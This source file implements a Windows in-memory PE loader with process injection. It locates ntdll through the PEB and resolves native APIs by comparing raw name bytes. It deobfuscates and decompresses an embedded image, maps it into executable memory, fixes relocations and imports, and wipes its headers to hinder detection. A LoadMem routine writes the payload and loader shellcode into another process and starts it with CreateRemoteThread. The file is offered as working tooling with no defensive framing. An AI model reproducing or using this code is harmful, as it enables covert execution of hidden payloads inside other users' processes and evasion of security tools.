#pragma once

#ifdef _M_IX86
#define POINTER_TYPE DWORD
#else
#define POINTER_TYPE DWORD64
#endif


typedef struct ___PEB_LDR_DATA {
	/*000*/  ULONG Length;
	/*004*/  BOOLEAN Initialized;
	/*008*/  PVOID SsHandle;
	/*00C*/  LIST_ENTRY ModuleListLoadOrder;
	/*014*/  LIST_ENTRY ModuleListMemoryOrder;
	/*018*/  LIST_ENTRY ModuleListInitOrder;
	/*020*/
} __PEB_LDR_DATA, *__PPEB_LDR_DATA;

LPVOID WINAPI MemoryLoad(_comp * data) {
	struct ml_st {
		POINTER_TYPE h_ntdll;

		_LdrGetProcedureAddress  GetProcedureAddress;
		_LdrLoadDll				 LoadDll;
		_ZwAllocateVirtualMemory AllocateVirtualMemory;
		_ZwFreeVirtualMemory	 FreeVirtualMemory;
		_RtlDecompressBuffer     DecompressBuffer;
		_RtlAnsiStringToUnicodeString AnsiStringToUnicodeString;
		_RtlFreeUnicodeString FreeUnicodeString ;

		LPVOID image_unpacked;
		ULONG uncompressed_size;

		PIMAGE_DOS_HEADER dos_header;
		PIMAGE_NT_HEADERS old_header;
		LPVOID code;
		PIMAGE_NT_HEADERS rheaders;
		POINTER_TYPE locationDelta;

		UNICODE_STRING wide_str;
		ANSI_STRING ansi_str;
		PPEB pPEB;
	}th;
	memset(&th, 0, sizeof(th));
#ifdef _M_IX86
	th.pPEB = (PPEB)__readfsdword(0x30);
#else
	th.pPEB = (PPEB)__readgsqword(0x60);
#endif
	pProcessModuleInfo ProcessModule = (pProcessModuleInfo)th.pPEB->Ldr;
	pModuleInfoNode ModuleList = (pModuleInfoNode)ProcessModule->ModuleListLoadOrder.Flink;

	//finding dlls trought the PEB
	while (ModuleList->BaseAddress){	
		//ntdll
		if ((*(ModuleList->BaseDllName.Buffer) == 'N' || *(ModuleList->BaseDllName.Buffer) == 'n') && *(ModuleList->BaseDllName.Buffer + 1) == 't'
			&& *(ModuleList->BaseDllName.Buffer + 1) == 't' && *(ModuleList->BaseDllName.Buffer + 3) == *(ModuleList->BaseDllName.Buffer + 4)) {
			th.h_ntdll = (POINTER_TYPE)ModuleList->BaseAddress;
		}
		if (th.h_ntdll) {goto all_dlls_found;}

		ModuleList = (pModuleInfoNode)ModuleList->InLoadOrderModuleList.Flink;
	}
all_dlls_found:

	//finding functions throught export 
	IMAGE_NT_HEADERS * pe = PIMAGE_NT_HEADERS(th.h_ntdll + PIMAGE_DOS_HEADER(th.h_ntdll)->e_lfanew);
	IMAGE_EXPORT_DIRECTORY * exportDir = PIMAGE_EXPORT_DIRECTORY(th.h_ntdll + pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD * namePtr = (DWORD *)(th.h_ntdll + exportDir->AddressOfNames);     // Адрес имен функций.
	WORD * ordPtr = (WORD *)(th.h_ntdll + exportDir->AddressOfNameOrdinals);

						 //char code																			//name
	     // hash 1    |  hash 2     |  hash 3     |  hash 4     |   hash 5    | hash 6
		/*5A 77 41 6C | 6C 6F 63 61 | 74 65 56 69 | 72 74 75 61 | 6C 4D 65 6D | 6F 72 79*/					// ZwAllocateVirtualMemory
		/*5A 77 46 72 | 65 65 56 69 | 72 74 75 61 | 6C 4D 65 6D | 6F 72 79*/								// ZwFreeVirtualMemory
		/*4C 64 72 4C | 6F 61 64 44 | 6C 6C*/																// LdrLoadDll
		/*4C 64 72 47 | 65 74 50 72 | 6F 63 65 64 | 75 72 65 41 | 64 64 72 65 | 73 73*/						// LdrGetProcedureAddress
		/*52 74 6C 41 | 6E 73 69 53 | 74 72 69 6E | 67 54 6F 55 | 6E 69 63 6F | 64 65 53 74 | 72 69 6E 67*/ // RtlAnsiStringToUnicodeString
		/*52 74 6C 46 | 72 65 65 55 | 6E 69 63 6F | 64 65 53 74 | 72 69 6E 67*/								// RtlFreeUnicodeString
		/*52 74 6C 44 | 65 63 6F 6D | 70 72 65 73 | 73 42 75 66 | 66 65 72*/								// RtlDecompressBuffer

	for (;; ++namePtr, ++ordPtr)
	{
		DWORD hash1 = *(DWORD *)(th.h_ntdll + *namePtr);
		DWORD hash2 = *(DWORD *)(th.h_ntdll + *namePtr + 4);
		DWORD hash3 = *(DWORD *)(th.h_ntdll + *namePtr + 8);
		DWORD hash4 = *(DWORD *)(th.h_ntdll + *namePtr + 12);
		DWORD hash5 = *(DWORD *)(th.h_ntdll + *namePtr + 16);
		DWORD hash6 = *(DWORD *)(th.h_ntdll + *namePtr + 20);

		if (!th.AllocateVirtualMemory && hash1 == 0x6C41775A && hash2 == 0x61636F6C && hash3 == 0x69566574
			&& hash4 == 0x61757472 && hash5 == 0x6D654D6C && hash6 == 0x0079726F) {//ZwAllocateVirtualMemory
			th.AllocateVirtualMemory = (_ZwAllocateVirtualMemory)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.FreeVirtualMemory && hash1 == 0x7246775A && hash2 == 0x69566565 && hash3 == 0x61757472
			&& hash4 == 0x6D654D6C && hash5 == 0x0079726F) {//ZwFreeVirtualMemory
			th.FreeVirtualMemory = (_ZwFreeVirtualMemory)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.LoadDll && hash1 == 0x4C72644C && hash2 == 0x4464616F) {//LdrLoadDll
			th.LoadDll =				(_LdrLoadDll)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.GetProcedureAddress && hash1 == 0x4772644C && hash2 == 0x72507465 && hash3 == 0x6465636F
			&& hash4 == 0x41657275 && hash5 == 0x65726464) {//LdrGetProcedureAddress
			th.GetProcedureAddress =   (_LdrGetProcedureAddress)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.AnsiStringToUnicodeString && hash1 == 0x416C7452 && hash2 == 0x5369736E && hash3 == 0x6E697274
			&& hash4 == 0x556F5467 && hash5 == 0x6F63696E && hash6 == 0x74536564) {//RtlAnsiStringToUnicodeString
			th.AnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.FreeUnicodeString && hash1 == 0x466C7452 && hash2 == 0x55656572 && hash3 == 0x6F63696E
			&& hash4 == 0x74536564 && hash5 == 0x676E6972) {//RtlFreeUnicodeString
			th.FreeUnicodeString = (_RtlFreeUnicodeString)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}
		if (!th.DecompressBuffer && hash1 == 0x446C7452 && hash2 == 0x6D6F6365 && hash3 == 0x73657270
			&& hash4 == 0x66754273 && hash5 == 0x00726566) {//RtlDecompressBuffer
			th.DecompressBuffer = (_RtlDecompressBuffer)(th.h_ntdll + (*(DWORD *)(th.h_ntdll + exportDir->AddressOfFunctions + *ordPtr * 4)));
		}

		if (th.LoadDll && th.AllocateVirtualMemory && th.FreeVirtualMemory && th.GetProcedureAddress && th.DecompressBuffer && th.FreeUnicodeString && th.AnsiStringToUnicodeString)break;
	}

	//unpack data
	for (int i = 0; i < 4; i++) {
		((WORD*)data)[2 + i] += data->sub_seed;
		((WORD*)data)[2 + i] ^= data->xor_seed;
		data->xor_seed += i + 1234;
	}
	//unpack image
	for (int i = 4; i < data->compressed_size / 2; i++) {
		((WORD*)data)[2 + i] += data->sub_seed;
		((WORD*)data)[2 + i] ^= data->xor_seed;
		data->xor_seed += i + 1234;
	}

	//uncompress image buffer
	SIZE_T all_size = data->original_size;

	th.AllocateVirtualMemory((HANDLE)-1, &th.image_unpacked, 0, &all_size, MEM_COMMIT, PAGE_READWRITE);
	th.DecompressBuffer(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,(PUCHAR)th.image_unpacked,data->original_size,
		(UCHAR *)data->compressed_buffer,data->compressed_size,&th.uncompressed_size);


	th.dos_header = (PIMAGE_DOS_HEADER)th.image_unpacked;
	if (th.dos_header->e_magic != IMAGE_DOS_SIGNATURE) { return NULL; }
	th.old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(th.image_unpacked))[th.dos_header->e_lfanew];
	if (th.old_header->Signature != IMAGE_NT_SIGNATURE) { return NULL; }

	all_size = th.old_header->OptionalHeader.SizeOfImage;
	th.AllocateVirtualMemory((HANDLE)-1,&th.code,0, &all_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (th.code == NULL) { return NULL; }

	memcpy(th.code, th.dos_header, th.old_header->OptionalHeader.SizeOfHeaders);
	th.rheaders = (PIMAGE_NT_HEADERS)&((const unsigned char *)(th.code))[th.dos_header->e_lfanew];
	th.rheaders->OptionalHeader.ImageBase = (DWORD)th.code;

	//copy sections
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(th.rheaders);
	for (int i = 0; i<th.rheaders->FileHeader.NumberOfSections; i++, section++) {
		if (section->SizeOfRawData == 0) { //not have data
			if (th.old_header->OptionalHeader.SectionAlignment > 0) {
				memset(((POINTER_TYPE)th.code + section->VirtualAddress), 0, th.old_header->OptionalHeader.SectionAlignment);
			}
		}
		else {
			memcpy(((POINTER_TYPE)th.code + section->VirtualAddress),((POINTER_TYPE)th.image_unpacked + section->PointerToRawData), section->SizeOfRawData);
		}
	}

	//fix relocs
	th.locationDelta = (POINTER_TYPE)((POINTER_TYPE)th.code - th.old_header->OptionalHeader.ImageBase);
	if (th.locationDelta != 0) {
		PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(th.rheaders, IMAGE_DIRECTORY_ENTRY_BASERELOC);
		if (directory->Size > 0) {
			PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((POINTER_TYPE)th.code + directory->VirtualAddress);
			for (; relocation->VirtualAddress > 0;) {
				unsigned char *dest = (unsigned char *)((POINTER_TYPE)th.code + relocation->VirtualAddress);
				unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);
				for (int i = 0; i<((relocation->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++) {
					DWORD *patchAddrHL;

					int type, offset;

					type = *relInfo >> 12;
					offset = *relInfo & 0xfff;

					switch (type)
					{
					case IMAGE_REL_BASED_ABSOLUTE: {
						break;
					}

					case IMAGE_REL_BASED_HIGHLOW: {
						patchAddrHL = (DWORD *)(dest + offset);
						*patchAddrHL += (DWORD)th.locationDelta;
						break;
					}
#ifdef _M_X64
					case IMAGE_REL_BASED_DIR64: {
						ULONGLONG *patchAddr64 = (ULONGLONG *)(dest + offset);
						*patchAddr64 += (ULONGLONG)th.locationDelta;
						break;
					}
#endif
					default:break;
					}
				}
				relocation = (PIMAGE_BASE_RELOCATION)(((char *)relocation) + relocation->SizeOfBlock);
			}
		}

	}

	//Update import
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(th.rheaders, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (directory->Size > 0) {
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((POINTER_TYPE)th.code + directory->VirtualAddress);
		for (; importDesc && importDesc->Name; importDesc++) {
			POINTER_TYPE *thunkRef;
			FARPROC *funcRef;
			HMODULE handle;
			
			th.ansi_str.Buffer = (char*)((POINTER_TYPE)th.code + importDesc->Name);
			int len;
			for (len = 0; th.ansi_str.Buffer[len]; len++) {}
			th.ansi_str.Length = len;
			th.ansi_str.MaximumLength = th.ansi_str.Length + 1;
			th.AnsiStringToUnicodeString(&th.wide_str, &th.ansi_str, true);
			th.LoadDll(NULL, 0, &th.wide_str, &handle);
			th.FreeUnicodeString(&th.wide_str);

			if (handle == NULL) { 
				return NULL;
			}

			if (importDesc->OriginalFirstThunk) {
				thunkRef = (POINTER_TYPE *)((POINTER_TYPE)th.code + importDesc->OriginalFirstThunk);
				funcRef = (FARPROC *)((POINTER_TYPE)th.code + importDesc->FirstThunk);
			}
			else {
				thunkRef = (POINTER_TYPE *)((POINTER_TYPE)th.code + importDesc->FirstThunk);
				funcRef = (FARPROC *)((POINTER_TYPE)th.code + importDesc->FirstThunk);
			}
			for (; *thunkRef; thunkRef++, funcRef++) {
				if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
					th.GetProcedureAddress((HMODULE)handle, NULL, (IMAGE_ORDINAL(*thunkRef) & 0xFFFF), (PVOID*)funcRef);
				}
				else {
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((POINTER_TYPE)th.code + (*thunkRef));
					th.ansi_str.Buffer = (char*)(&thunkData->Name);
					int len;
					for(len = 0; th.ansi_str.Buffer[len];len++){}
					th.ansi_str.Length = len;
					th.ansi_str.MaximumLength = th.ansi_str.Length + 1;
					th.GetProcedureAddress((HMODULE)handle, &th.ansi_str, 0, (PVOID*)funcRef);
				}
				if (*funcRef == 0) {
					break;
				}
			}

		}
	}
	// get entry point
	DllEntryProc DllEntry = (DllEntryProc)((POINTER_TYPE)th.code + th.rheaders->OptionalHeader.AddressOfEntryPoint);

	//erase headers
	memset(th.code,	 0,	sizeof(PIMAGE_DOS_HEADER)); //dos
	memset(th.rheaders, 0, sizeof(PIMAGE_NT_HEADERS)); //nt

	if (th.rheaders->OptionalHeader.AddressOfEntryPoint != 0) {
		DllEntry((HINSTANCE)th.code, DLL_PROCESS_ATTACH, data);
	}
	th.FreeVirtualMemory((HANDLE)-1, &th.image_unpacked, &all_size, MEM_DECOMMIT);
	return th.code;
}
void WINAPI MemoryLoadLibraryEx_end() {}



void LoadMem(DWORD procID, LPVOID file, DWORD size) {
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
	int ShellCodeSize = sizeof(loader);
	int loadsize = size + ShellCodeSize;

	LPVOID base = VirtualAlloc(0, loadsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID inbase = VirtualAllocEx(hProc, 0, loadsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(base, file, size);
	memcpy((LPVOID)((long long)base + size), loader, ShellCodeSize);
	SIZE_T ndw = 0;
	WriteProcessMemory(hProc, inbase, base, loadsize, &ndw);

	CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)((DWORD64)inbase + size), inbase, 0, 0);

	CloseHandle(hProc);
}